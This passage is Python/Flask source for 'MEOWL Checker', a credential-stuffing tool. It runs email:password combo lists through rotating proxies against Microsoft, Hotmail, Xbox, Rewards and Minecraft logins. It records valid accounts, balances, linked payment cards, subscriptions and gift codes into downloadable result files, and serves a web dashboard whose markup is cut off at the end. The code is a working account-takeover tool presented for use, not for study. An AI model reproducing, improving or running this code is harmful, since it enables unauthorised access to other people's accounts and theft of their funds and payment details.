            if data.get('bwstars'): line += f" | BW★{data['bwstars']}"
            if data.get('value_tier'): line += f" | {data['value_tier']}-Tier"
            if data.get('ms_balance') and data['ms_balance'] != '0.00 USD':
                line += f" | Bal:{data['ms_balance']}"
            if data.get('ms_payment_methods'):
                line += f" | Cards:{len(data['ms_payment_methods'])}"
            if data.get('donut_smp'): line += f" | Donut:{data['donut_smp'][:40]}"

            session.results['mc_full'].append(line)
            if data.get('name') and data['name'] != 'N/A':
                session.results['mc_names'].append(f"{email}:{password} | {data['name']} | {data.get('og_name','') or '-'} | {data.get('value_tier','C')}")
            if data.get('ms_balance') and data['ms_balance'] != '0.00 USD':
                session.results['mc_balance'].append(f"{email}:{password} | {data['ms_balance']}")
            if 'ULTIMATE' in str(data.get('type','')).upper():
                session.results['mc_xgpu'].append(f"{email}:{password} | {data.get('type')}")
            if data.get('slothpixel_info'):
                session.results['mc_hypixel'].append(f"{email}:{password} | {data['slothpixel_info']}")

        session.add_hit("MINECRAFT", f"{email} | {data.get('name','?')} | {data.get('type','?')} | {data.get('value_tier','C')}", "gold")
        # Secondary hits
        if data.get('ms_balance') and data['ms_balance'] != '0.00 USD':
            session.add_hit("MC-BALANCE", f"{email} | {data['ms_balance']}", "gold")
        if data.get('donut_smp'):
            session.add_hit("DONUT-SMP", f"{email} | {data['donut_smp'][:60]}", "cyan")
    elif status == '2FA':
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    elif status in ('ERROR',):
        errs = str(r.get('error', '') or r.get('diag', {}).get('exception', ''))
        if proxy and ("Max retries" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.errors += 1
            session.bad += 1
        session.add_hit("ERROR", f"{email} | {errs[:80]}", "danger")
    else:
        errs = str(r.get('diag', {}).get('reason', ''))
        if proxy and ("Max retries" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.bad += 1
        reason = r.get('diag', {}).get('reason', '') or 'login_failed'
        session.add_hit("BAD", f"{email} ({reason})", "danger")


def check_microsoft_balance_account(session: CheckSession, combo: str, proxy: str):
    """NEW: MS balance + linked cards standalone"""
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    try:
        chk = MicrosoftBalanceChecker(email, password, proxy=proxy)
        r = chk.check()
    except requests.exceptions.ProxyError:
        raise
    except Exception as e:
        with session.lock:
            session.errors += 1
        session.add_hit("ERROR", f"{email} | {str(e)[:80]}", "danger")
        return

    status = r.get('status', 'BAD')
    if status == 'HIT':
        data = r.get('data', {})
        with session.lock:
            session.valid += 1
            session.ms_balance_hits += 1
            if data.get('balance') and data['balance'] != '0.00 USD':
                session.mc_balance += 1
                session.results['ms_balance'].append(f"{email}:{password} | {data['balance']} | {data.get('country','?')}")
            if data.get('payment_methods'):
                session.mc_cards += 1
                session.results['ms_cards'].append(f"{email}:{password} | {', '.join(str(x) for x in data['payment_methods'])}")
        if data.get('balance') and data['balance'] != '0.00 USD':
            session.add_hit("MS-BALANCE", f"{email} | {data['balance']}", "gold")
        if data.get('payment_methods'):
            session.add_hit("MS-CARDS", f"{email} | {', '.join(str(x) for x in data['payment_methods'])}", "cyan")
        if data.get('linked_accounts'):
            session.add_hit("MS-LINKED", f"{email} | {', '.join(data['linked_accounts'])}", "cyan")
        if data.get('subscriptions'):
            session.add_hit("MS-SUBS", f"{email} | {', '.join(str(x) for x in data['subscriptions'][:3])}", "cyan")
    elif status == 'ZERO':
        with session.lock:
            session.valid += 1
        session.add_hit("ZERO", email, "warn")
    elif status == '2FA':
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    else:
        errs = str(r.get('diag', {}).get('reason', ''))
        if proxy and ("Max retries" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.bad += 1
        reason = r.get('diag', {}).get('reason', '') or 'login_failed'
        session.add_hit("BAD", f"{email} ({reason})", "danger")


def run_check_worker(session: CheckSession, combo: str, check_func):
    proxy = session.proxy_pool.get()
    
    if proxy == "ALL_DEAD":
        session.proxy_depleted = True
        with session.lock:
            session.active -= 1
        session.accounts.appendleft(combo)
        return

    try:
        check_func(session, combo, proxy)
    except Exception as e:
        if proxy and ("Max retries exceeded" in str(e) or "PROXY_DEAD" in str(e)):
            session.proxy_pool.mark_dead(proxy)
            session.add_hit("PROXY_DEAD", f"{proxy} [Switched]", "warn")
            session.accounts.appendleft(combo)
            with session.lock:
                session.active -= 1
            return
        else:
            with session.lock:
                session.errors += 1
            session.add_hit("ERROR", f"{combo[:40]} {str(e)[:40]}", "danger")
    
    with session.lock:
        session.checked += 1
        session.active -= 1

def run_checker(session_id: str):
    session = sessions.get(session_id)
    if not session: return

    with session.lock:
        session.running = True
        session.stopped = False
        session.completed = False
        session.proxy_depleted = False

    if session.checker_type == "hotmail":         fn = check_hotmail_account
    elif session.checker_type == "xbox":          fn = check_xbox_account
    elif session.checker_type == "codefetcher":   fn = check_codefetcher_account
    elif session.checker_type == "minecraft":     fn = check_minecraft_account
    elif session.checker_type == "msbalance":     fn = check_microsoft_balance_account
    else:                                          fn = check_rewards_account

    threads = []
    while session.accounts and session.running and not session.stopped:
        if session.proxy_depleted:
            time.sleep(1)
            continue

        while (len(threads) < session.threads and session.accounts
               and session.running and not session.stopped and not session.proxy_depleted):
            acct = session.accounts.popleft()
            with session.lock:
                session.active += 1
            t = threading.Thread(target=run_check_worker, args=(session, acct, fn), daemon=True)
            t.start()
            threads.append(t)
        threads = [t for t in threads if t.is_alive()]
        time.sleep(0.1)

    for t in threads:
        try: t.join(timeout=THREAD_JOIN_TIMEOUT)
        except Exception: pass

    with session.lock:
        session.running = False
        if not session.stopped:
            session.completed = True
        session.active = 0

# ===== Flask App =====
app = Flask(__name__)
sessions: Dict[str, CheckSession] = {}
validation_jobs: Dict[str, Dict[str, Any]] = {}

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/manifest.json')
def manifest():
    return jsonify({
        "name": "MEOWL Checker",
        "short_name": "MEOWL",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#010814",
        "theme_color": "#00b4d8",
        "icons": [{
            "src": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
            "sizes": "192x192",
            "type": "image/png"
        }]
    })

@app.route('/api/settings', methods=['GET', 'POST'])
def api_settings():
    global SETTINGS
    if request.method == 'POST':
        body = request.get_json(force=True, silent=True) or {}
        SETTINGS.update(body)
        save_settings()
        return jsonify({'ok': True})
    return jsonify(SETTINGS)

# ===== Proxy validator with live stats =====
def _check_one_proxy(p):
    start_time = time.time()
    proxy_url = parse_proxy(p)
    if not proxy_url:
        return {'proxy': p, 'status': 'Invalid Format', 'time': 0, 'ip': ''}
    try:
        s = requests.Session()
        r = s.get('https://api.ipify.org?format=json',
                  proxies={'http': proxy_url, 'https': proxy_url}, timeout=10)
        if r.status_code == 200:
            return {'proxy': p, 'status': 'Valid',
                    'time': round(time.time() - start_time, 2),
                    'ip': r.json().get('ip', '')}
        else:
            return {'proxy': p, 'status': f'HTTP {r.status_code}',
                    'time': round(time.time() - start_time, 2), 'ip': ''}
    except Exception:
        return {'proxy': p, 'status': 'Dead',
                'time': round(time.time() - start_time, 2), 'ip': ''}

@app.route('/api/validate/start', methods=['POST'])
def api_validate_start():
    body = request.get_json(force=True, silent=True) or {}
    proxies = [p for p in (body.get('proxies') or []) if p]
    if not proxies:
        return jsonify({'error': 'no proxies'}), 400
    jid = str(uuid.uuid4())[:8]
    job = {'total': len(proxies), 'checked': 0, 'valid': 0, 'dead': 0,
           'results': [], 'done': False, 'lock': threading.Lock()}
    validation_jobs[jid] = job

    def _worker():
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = {ex.submit(_check_one_proxy, p): p for p in proxies}
            for f in as_completed(futures):
                try:
                    r = f.result()
                except Exception:
                    r = {'proxy': futures[f], 'status': 'Error', 'time': 0, 'ip': ''}
                with job['lock']:
                    job['results'].append(r)
                    job['checked'] += 1
                    if r.get('status') == 'Valid':
                        job['valid'] += 1
                    else:
                        job['dead'] += 1
        job['done'] = True

    threading.Thread(target=_worker, daemon=True).start()
    return jsonify({'job_id': jid, 'total': len(proxies)})

@app.route('/api/validate/status/<jid>')
def api_validate_status(jid):
    job = validation_jobs.get(jid)
    if not job:
        return jsonify({'error': 'not found'}), 404
    with job['lock']:
        return jsonify({
            'total': job['total'], 'checked': job['checked'],
            'valid': job['valid'], 'dead': job['dead'],
            'results': list(job['results']), 'done': job['done'],
        })

# keep original batch endpoint for backward compat
@app.route('/api/validate', methods=['POST'])
def api_validate():
    body = request.get_json(force=True, silent=True) or {}
    proxies = body.get('proxies', [])
    if not proxies: return jsonify([])
    results = list(ThreadPoolExecutor(max_workers=20).map(_check_one_proxy, proxies))
    return jsonify(results)

@app.route('/api/start', methods=['POST'])
def api_start():
    try:
        body = request.get_json(force=True, silent=True) or {}
        raw = body.get('accounts', [])
        accounts = [a for a in (normalize_combo(l) for l in raw) if a]
        if not accounts:
            return jsonify({'error': 'no valid accounts'}), 400
        checker_type = body.get('checker_type', 'hotmail')
        keywords = body.get('keywords', []) or ['Xbox']
        proxies = [p for p in (parse_proxy(x) for x in (body.get('proxies') or [])) if p]
        filename = body.get('filename', 'meowl_run')
        threads = int(body.get('threads', THREADS_DEFAULT))
        session = CheckSession(accounts, keywords, checker_type, filename, proxies, threads)
        sessions[session.session_id] = session
        threading.Thread(target=run_checker, args=(session.session_id,), daemon=True).start()
        return jsonify({'session_id': session.session_id, 'total': session.total,
                        'proxied': len(session.proxy_pool.proxies) > 0, 'threads': session.threads})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/proxy_switch', methods=['POST'])
def api_proxy_switch():
    body = request.get_json(force=True, silent=True) or {}
    sid = body.get('session_id')
    s = sessions.get(sid)
    if s:
        s.proxy_pool.proxyless_mode = True
        s.proxy_depleted = False
        return jsonify({'ok': True})
    return jsonify({'error': 'session not found'}), 404

@app.route('/api/resume/<sid>', methods=['POST'])
def api_resume(sid):
    s = sessions.get(sid)
    if not s: return jsonify({'error': 'no session'}), 404
    if s.running: return jsonify({'error': 'already running'}), 400
    if s.completed: return jsonify({'error': 'already completed'}), 400
    threading.Thread(target=run_checker, args=(sid,), daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/status/<sid>')
def api_status(sid):
    s = sessions.get(sid)
    if not s: return jsonify({'error': 'no session'}), 404
    return jsonify(s.get_stats())

@app.route('/api/hits/<sid>')
def api_hits(sid):
    s = sessions.get(sid)
    if not s: return jsonify([])
    return jsonify(s.get_hits())

# NEW: logs + stats for CHECKING LOGS tab
@app.route('/api/logs/<sid>')
def api_logs(sid):
    s = sessions.get(sid)
    if not s:
        return jsonify({'error': 'no session', 'logs': [], 'stats': {}}), 404
    return jsonify({'logs': s.get_logs(500), 'stats': s.get_stats()})

@app.route('/api/stop/<sid>', methods=['POST'])
def api_stop(sid):
    s = sessions.get(sid)
    if not s: return jsonify({'error': 'no session'}), 404
    s.stop()
    return jsonify({'ok': True})

@app.route('/api/test', methods=['POST'])
def api_test():
    body = request.get_json(force=True, silent=True) or {}
    combo = (body.get('combo') or '').strip()
    checker_type = body.get('checker_type', 'hotmail')
    proxies = [p for p in (parse_proxy(x) for x in (body.get('proxies') or [])) if p]
    proxy = proxies[0] if proxies else None
    if ':' not in combo:
        return jsonify({'error': 'combo must be email:password'}), 400
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    out = {'email': email, 'checker_type': checker_type, 'proxied': bool(proxy)}
    try:
        if checker_type == 'xbox':
            chk = XboxChecker(proxy=proxy)
            r = chk.check_v2(email, password)
            out['status'] = r.get('status')
            out['diag'] = chk._diag
            if r.get('data'):
                out['gamerscore'] = r['data'].get('gamerscore')
                out['gamertag']   = r['data'].get('gamertag')
                out['gamepass']   = r['data'].get('gamepass_type')
        elif checker_type == 'rewards':
            chk = RewardsChecker(proxy=proxy)
            status, result = chk.check_account(email, password)
            out['status'] = status
            out['diag'] = chk._diag
            if isinstance(result, dict):
                out['result'] = {k: v for k, v in result.items()
                                 if k in ('points', 'level', 'country', 'name')}
        elif checker_type == 'codefetcher':
            diag = {}
            codes = _fetch_codes_for_account(email, password, proxy=proxy, diag=diag)
            out['status'] = 'CODES' if codes else 'BAD'
            out['diag'] = diag
            out['codes'] = codes
        elif checker_type == 'minecraft':
            chk = MinecraftChecker(email, password, proxy=proxy)
            r = chk.check()
            out['status'] = r.get('status')
            out['diag'] = r.get('diag', {})
            if r.get('data'):
                d = r['data']
                out['name'] = d.get('name')
                out['type'] = d.get('type')
                out['value_tier'] = d.get('value_tier')
                out['ms_balance'] = d.get('ms_balance')
                out['cards'] = d.get('ms_payment_methods')
                out['donut_smp'] = d.get('donut_smp')
                out['hypixl'] = d.get('hypixl')
                out['bwstars'] = d.get('bwstars')
        elif checker_type == 'msbalance':
            chk = MicrosoftBalanceChecker(email, password, proxy=proxy)
            r = chk.check()
            out['status'] = r.get('status')
            out['diag'] = r.get('diag', {})
            if r.get('data'):
                out['balance'] = r['data'].get('balance')
                out['cards'] = r['data'].get('payment_methods')
                out['linked'] = r['data'].get('linked_accounts')
                out['subs'] = r['data'].get('subscriptions')
        else:
            chk = MicrosoftInboxChecker(email, password, proxy=proxy, inbox_keywords=['Steam'])
            status = chk.login()
            out['status'] = status
            out['diag'] = chk._diag
    except Exception as e:
        out['status'] = 'EXCEPTION'
        out['error'] = str(e)[:200]
    return jsonify(out)

def _build_zip(s: CheckSession) -> BytesIO:
    buf = BytesIO()
    status = "STOPPED" if s.stopped else "COMPLETE"
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        if s.checker_type == "codefetcher":
            z.writestr('summary.txt',
                f"MEOWL — CODE FETCHER\nStatus: {status}\nTotal: {s.total}\n"
                f"Checked: {s.checked}\nValid: {s.valid}\nCodes: {len(s.codes_found)}\n"
                f"Accounts w/ Codes: {s.accounts_with_codes}\n2FA: {s.twofa}\n"
                f"Bad: {s.bad}\nErrors: {s.errors}\n"
                f"Threads: {s.threads}\n"
                f"Proxied: {'yes' if len(s.proxy_pool.proxies) else 'no'}\n")
            z.writestr('codes.txt', '\n'.join(c['code'] for c in s.codes_found))
            z.writestr('detailed_codes.txt',
                '\n'.join(f"{c['code']} | {c['email']} | {c['info']}" for c in s.codes_found))
        else:
            z.writestr('Summary.txt',
                f"MEOWL\nStatus: {status}\nTotal: {s.total}\nChecked: {s.checked}\n"
                f"Valid: {s.valid}\nInbox: {s.inbox}\n2FA: {s.twofa}\n"
                f"Bad: {s.bad}\nErrors: {s.errors}\n"
                f"Premium: {s.premium}\nFree: {s.free}\n"
                f"Rewards Hits: {s.rewards_hits}\nRewards Points: {s.rewards_points}\n"
                f"MC w/ Name: {s.mc_with_name}\nMC Balance Hits: {s.mc_balance}\n"
                f"MC Cards: {s.mc_cards}\nMC Donut: {s.mc_donut}\nMC Hypixel: {s.mc_hypixel}\n"
                f"MS Balance Hits: {s.ms_balance_hits}\n"
                f"Keywords: {', '.join(s.keywords)}\n"
                f"Threads: {s.threads}\n"
                f"Proxied: {'yes' if len(s.proxy_pool.proxies) else 'no'}\n")
            for key, fname in [('valid', 'Valid.txt'), ('twofa', '2FA.txt'),
                               ('banned', 'Banned.txt'), ('premium', 'Premium.txt'),
                               ('free', 'Free.txt'), ('games', 'Games_List.txt'),
                               ('rewards_hits', 'Rewards_Hits.txt'),
                               ('rewards_zero', 'Rewards_Zero.txt'),
                               ('rewards_custom', 'Rewards_Custom.txt'),
                               ('rewards_rate_limit', 'Rewards_Rate_Limited.txt'),
                               ('mc_full', 'Minecraft_Full.txt'),
                               ('mc_names', 'Minecraft_Names.txt'),
                               ('mc_balance', 'Minecraft_Balance.txt'),
                               ('mc_xgpu', 'Minecraft_XGPU.txt'),
                               ('mc_hypixel', 'Minecraft_Hypixel.txt'),
                               ('ms_balance', 'MS_Balance.txt'),
                               ('ms_cards', 'MS_Cards.txt')]:
                if s.results.get(key):
                    z.writestr(fname, '\n'.join(s.results[key]))
            for kw, hits in s.keyword_details.items():
                safe = re.sub(r'[<>:"/\\|?*]', '_', kw.strip()) or 'keyword'
                z.writestr(f'Keywords/{safe}.txt', '\n'.join(hits))
    buf.seek(0)
    return buf

@app.route('/api/download/<sid>')
def api_download(sid):
    s = sessions.get(sid)
    if not s: return "session not found", 404
    try:
        buf = _build_zip(s)
        resp = make_response(buf.getvalue())
        resp.headers['Content-Type'] = 'application/zip'
        resp.headers['Content-Disposition'] = f'attachment; filename="MEOWL-RESULTS-{s.filename}.zip"'
        return resp
    except Exception as e:
        print(f"Download error: {e}")
        return f"Error creating zip: {e}", 500

# ===== HTML =====
HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#010814">
<link rel="manifest" href="/manifest.json">
<title>MEOWL // CHECKER</title>
<style>
:root{
  color-scheme: dark;
  --bg-start:#010814; --bg-end:#0a1a33;
  --panel:#0d1f38; --panel-2:#13284a; --border:#1d3557;
  --primary:#00b4d8; --secondary:#0077b6; --warn:#fca311; --danger:#ef233c;
  --text:#e0e6ed; --muted:#7b8ba7;
  --font:'JetBrains Mono','Fira Code','Courier New',monospace;
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html,body{min-height:100vh; background-color:var(--bg-start);}
body{
  background: linear-gradient(135deg, var(--bg-start) 0%, var(--bg-end) 100%);
  background-attachment: fixed;
  color:var(--text); font-family:var(--font); font-size:14px;
  padding:12px; padding-bottom:40px; overflow-x:hidden;
  background-image:
    radial-gradient(circle at 20% 0%,rgba(0,180,216,.08) 0%,transparent 55%),
    radial-gradient(circle at 80% 100%,rgba(0,119,182,.08) 0%,transparent 55%),
    linear-gradient(rgba(0,180,216,.05) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,180,216,.05) 1px,transparent 1px);
  background-size:100% 100%,100% 100%,28px 28px,28px 28px;
}
body::after{
  content:''; position:fixed; inset:0; pointer-events:none; z-index:9999;
  background:repeating-linear-gradient(0deg,rgba(0,0,0,.12) 0 1px,transparent 1px 3px);
}
h1{
  font-size:26px; letter-spacing:4px; text-align:center; padding:16px 0 4px;
  color:var(--primary); text-shadow:0 0 12px rgba(0,180,216,.7);
  animation:glitch 4s infinite;
}
h1 span{color:var(--secondary); text-shadow:0 0 12px rgba(0,119,182,.7)}
@keyframes glitch{
  0%,94%,100%{transform:translate(0,0)}
  95%{transform:translate(-1px,1px)}
  96%{transform:translate(2px,-1px)}
  97%{transform:translate(-2px,0)}
}
.tabs { display: flex; gap: 4px; margin-bottom: 12px; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 4px; margin-top: 16px;}
.tab { flex: 1; text-align: center; padding: 10px 4px; border-radius: 6px; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all .15s; color: var(--muted); }
.tab:hover { color: var(--text); }
.tab.active { background: rgba(0,180,216,.15); color: var(--primary); font-weight: 700; box-shadow: 0 0 10px rgba(0,180,216,.2) inset; }

.panel{ background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:14px; margin-bottom:12px; position:relative; }
.panel::before{ content:''; position:absolute; top:0; left:14px; right:14px; height:1px; background:linear-gradient(90deg,transparent,var(--primary),transparent); opacity:.4; }
.label{ font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:8px; }
textarea,input[type=text],input[type=password],input[type=color]{
  width:100%; background:var(--panel-2); color:var(--text); border:1px solid var(--border);
  border-radius:6px; padding:10px; font-family:var(--font); font-size:14px; outline:none;
  transition:border .15s; -webkit-appearance: none; appearance: none;
}
input[type=color]{ padding: 2px; height: 40px; cursor: pointer; }
textarea:focus,input:focus{border-color:var(--primary)}
textarea{resize:vertical;min-height:100px}
.file-wrap{position:relative}
.file-wrap input[type=file]{opacity:0;position:absolute;inset:0;cursor:pointer}
.file-btn{ border:1px dashed var(--border); border-radius:6px; padding:12px; text-align:center; color:var(--muted); font-size:11px; cursor:pointer; transition:all .15s; }
.file-btn:hover{border-color:var(--primary);color:var(--primary)}
.grid{display:grid;gap:8px;grid-template-columns:1fr 1fr}
.card{ background:var(--panel-2); border:1px solid var(--border); border-radius:6px; padding:12px 10px; text-align:center; cursor:pointer; transition:all .15s; font-size:13px; user-select:none; }
.card:hover{border-color:var(--secondary)}
.card.active{ border-color:var(--primary); background:rgba(0,180,216,.1); color:var(--primary); box-shadow:0 0 12px rgba(0,180,216,.3) inset; }
.card .em{font-size:20px;display:block;margin-bottom:4px}
.kw-wrap{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
.kw{ padding:6px 12px; border-radius:16px; border:1px solid var(--border); background:var(--panel-2); font-size:12px; cursor:pointer; user-select:none; transition:all .12s; color:var(--muted); }
.kw:hover{border-color:var(--secondary)}
.kw.active{ border-color:var(--primary); color:var(--primary); background:rgba(0,180,216,.1); box-shadow:0 0 8px rgba(0,180,216,.4); }
.toggle-row{display:flex;align-items:center;gap:10px;margin-bottom:8px}
.toggle{ position:relative; width:44px; height:24px; background:var(--panel-2); border:1px solid var(--border); border-radius:12px; cursor:pointer; transition:all .2s; flex-shrink:0; }
.toggle::after{ content:''; position:absolute; top:2px; left:2px; width:18px; height:18px; border-radius:50%; background:var(--muted); transition:all .2s; }
.toggle.on{background:rgba(0,180,216,.15);border-color:var(--primary)}
.toggle.on::after{left:22px;background:var(--primary);box-shadow:0 0 8px var(--primary)}
.toggle-label{font-size:12px;color:var(--muted)}
.toggle-label b{color:var(--secondary)}
.btn-row{display:flex;gap:8px;margin-top:8px}
button{
  flex:1; padding:14px; border-radius:6px; border:1px solid var(--border);
  background:var(--panel-2); color:var(--text); font-family:var(--font);
  font-size:13px; letter-spacing:1.5px; cursor:pointer; transition:all .15s;
  text-transform:uppercase; font-weight:600; min-height:44px;
  -webkit-appearance: none; appearance: none;
}
button:hover:not(:disabled){border-color:var(--primary);color:var(--primary)}
button:disabled{opacity:.35;cursor:not-allowed}
#start-btn{border-color:var(--primary);color:var(--primary);background:rgba(0,180,216,.06)}
#test-btn{border-color:var(--secondary);color:var(--secondary);background:rgba(0,119,182,.06);max-width:80px;font-size:11px;padding:10px}
#stop-btn{border-color:var(--danger);color:var(--danger);background:rgba(239,35,60,.06)}
#download-btn{border-color:var(--secondary);color:var(--secondary);background:rgba(0,119,182,.06)}
#menu-btn{border-color:var(--muted);color:var(--muted);background:rgba(123,139,167,.06);flex:0.5}
.hidden{display:none!important}
.bar-wrap{ height:22px; background:var(--panel-2); border:1px solid var(--border); border-radius:4px; overflow:hidden; position:relative; margin:8px 0; }
.bar-fill{ height:100%; width:0%; background:linear-gradient(90deg,var(--secondary),var(--primary)); transition:width .4s ease; position:relative; }
.bar-fill::after{ content:''; position:absolute; inset:0; background:repeating-linear-gradient(45deg,rgba(0,0,0,.15) 0 6px,transparent 6px 12px); animation:slide 1s linear infinite; }
@keyframes slide{from{background-position:0 0}to{background-position:24px 0}}
.bar-text{ position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-size:11px; color:var(--text); text-shadow:0 0 4px #000; font-weight:600; letter-spacing:1px; }
.stats{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px}
.stat{background:var(--panel-2);border:1px solid var(--border);border-radius:4px;padding:8px 10px}
.stat .k{font-size:9px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase}
.stat .v{font-size:16px;font-weight:700;margin-top:2px;color:var(--primary)}
.stat.warn .v{color:var(--warn)}
.stat.danger .v{color:var(--danger)}
.stat.cyan .v{color:var(--secondary)}
.stat.gold .v{color:#f0b429}
.status-row{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);margin-bottom:8px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0}
.dot.running{background:var(--primary);animation:pulse 1.2s infinite}
.dot.stopped{background:var(--warn)}
.dot.done{background:var(--secondary)}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,180,216,.7)}50%{box-shadow:0 0 0 8px rgba(0,180,216,0)}}
.hits{ background:var(--panel-2); border:1px solid var(--border); border-radius:6px; max-height:340px; overflow-y:auto; font-size:12px; }
.hit{ display:flex; gap:8px; padding:6px 10px; border-bottom:1px solid rgba(255,255,255,.03); animation:fadein .25s ease; }
.hit:last-child{border-bottom:none}
@keyframes fadein{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:translateX(0)}}
.hit .t{color:var(--muted);font-size:10px;min-width:56px;flex-shrink:0}
.hit .c{font-size:9px;padding:1px 5px;border-radius:3px;min-width:56px;text-align:center;letter-spacing:1px;flex-shrink:0;align-self:flex-start;font-weight:700}
.hit .c.green{background:rgba(0,180,216,.12);color:var(--primary)}
.hit .c.gold{background:rgba(252,163,17,.12);color:var(--warn)}
.hit .c.cyan{background:rgba(0,119,182,.12);color:var(--secondary)}
.hit .c.warn{background:rgba(252,163,17,.12);color:var(--warn)}
.hit .c.danger{background:rgba(239,35,60,.12);color:var(--danger)}
.hit .m{color:var(--text);word-break:break-all;flex:1}
.empty{text-align:center;padding:24px;color:var(--muted);font-size:12px}
.diag-box{ background:#000; border:1px solid var(--border); border-radius:6px; padding:10px; font-size:11px; max-height:300px; overflow:auto; white-space:pre-wrap; word-break:break-all; color:var(--text); font-family:var(--font); line-height:1.5; }
.diag-box .k{color:var(--secondary)}
.diag-box .v{color:var(--primary)}
.diag-box .err{color:var(--danger)}
.slider-row{display:flex;align-items:center;gap:12px}
.slider-row input[type=range]{ flex:1; -webkit-appearance:none; appearance:none; height:6px; background:var(--panel-2); border:1px solid var(--border); border-radius:3px; outline:none; }
.slider-row input[type=range]::-webkit-slider-thumb{ -webkit-appearance:none; appearance:none; width:22px; height:22px; border-radius:50%; background:var(--primary); cursor:pointer; box-shadow:0 0 8px rgba(0,180,216,.7); }
.slider-val{color:var(--primary);font-weight:700;font-size:16px;min-width:28px;text-align:right}
.footer{text-align:center;color:var(--muted);font-size:10px;letter-spacing:2px;margin-top:24px}
.settings-row { margin-bottom: 12px; }
.settings-row label { display: block; font-size: 11px; color: var(--muted); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 1px;}
.color-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px;}
.links-row { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap;}
.links-row a { flex: 1; text-align: center; padding: 10px; background: var(--panel-2); border-radius: 6px; color: var(--primary); text-decoration: none; font-size: 12px; border: 1px solid var(--border); text-transform: uppercase; font-weight: bold;}
.proxy-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px;}
.proxy-table th, .proxy-table td { padding: 6px; text-align: left; border-bottom: 1px solid var(--border); }
.proxy-table th { color: var(--secondary); }
.proxy-table td.valid { color: var(--primary); font-weight: bold;}
.proxy-table td.dead { color: var(--danger); }
.validator-actions { display: flex; gap: 8px; margin-top: 8px;}
.proxy-live-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 6px; margin-top: 10px;}
.log-line { padding: 4px 8px; border-bottom: 1px solid rgba(255,255,255,.03); font-size: 12px; display: flex; gap: 8px; }
.log-line .lt { color: var(--muted); min-width: 60px; font-size: 11px; flex-shrink: 0; }
.log-line .lk { font-weight: 700; min-width: 100px; flex-shrink: 0; font-size: 10px; letter-spacing: 1px; }
.log-line .lm { color: var(--text); word-break: break-all; flex: 1; }
.log-line .lk.HIT{color:#22c55e}
.log-line .lk.MINECRAFT{color:#fbbf24}
.log-line .lk.MC-BALANCE{color:#f59e0b}
.log-line .lk.DONUT-SMP{color:#a855f7}
.log-line .lk.MS-BALANCE{color:#06b6d4}
.log-line .lk.MS-CARDS{color:#06b6d4}
.log-line .lk.MS-LINKED{color:#0891b2}
.log-line .lk.MS-SUBS{color:#0891b2}
.log-line .lk.INBOX{color:#eab308}
.log-line .lk.PREMIUM{color:#eab308}
.log-line .lk.FREE{color:#3b82f6}
.log-line .lk.REWARDS{color:#eab308}
.log-line .lk.CODE{color:#eab308}
.log-line .lk.2FA{color:#f97316}
.log-line .lk.BAD{color:#ef4444}
.log-line .lk.ERROR{color:#dc2626}
.log-line .lk.PROXY_DEAD{color:#f97316}
.log-line .lk.ZERO, .log-line .lk.CUSTOM{color:#94a3b8}
.logs-box { background: var(--panel-2); border:1px solid var(--border); border-radius:6px; max-height:520px; overflow-y:auto; font-family: var(--font); }
.small-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 10px; }
.small-stat { background: var(--panel-2); border:1px solid var(--border); border-radius: 4px; padding: 6px 8px; }
.small-stat .k { font-size: 9px; color: var(--muted); letter-spacing: 1.5px; text-transform: uppercase;}
.small-stat .v { font-size: 14px; font-weight: 700; color: var(--primary); }
</style>
</head>
<body>

<h1>▰ MEO<span>WL</span> ▰</h1>

<div class="tabs">
  <div class="tab active" onclick="switchTab('checker')">Checker</div>
  <div class="tab" onclick="switchTab('logs')">Logs</div>
  <div class="tab" onclick="switchTab('validator')">Validator</div>
  <div class="tab" onclick="switchTab('settings')">Settings</div>
</div>

<!-- ================= CHECKER TAB ================= -->
<div id="tab-checker">
  <div id="setup">
    <div class="panel">
      <div class="label">01 · Accounts</div>
      <div class="file-wrap">
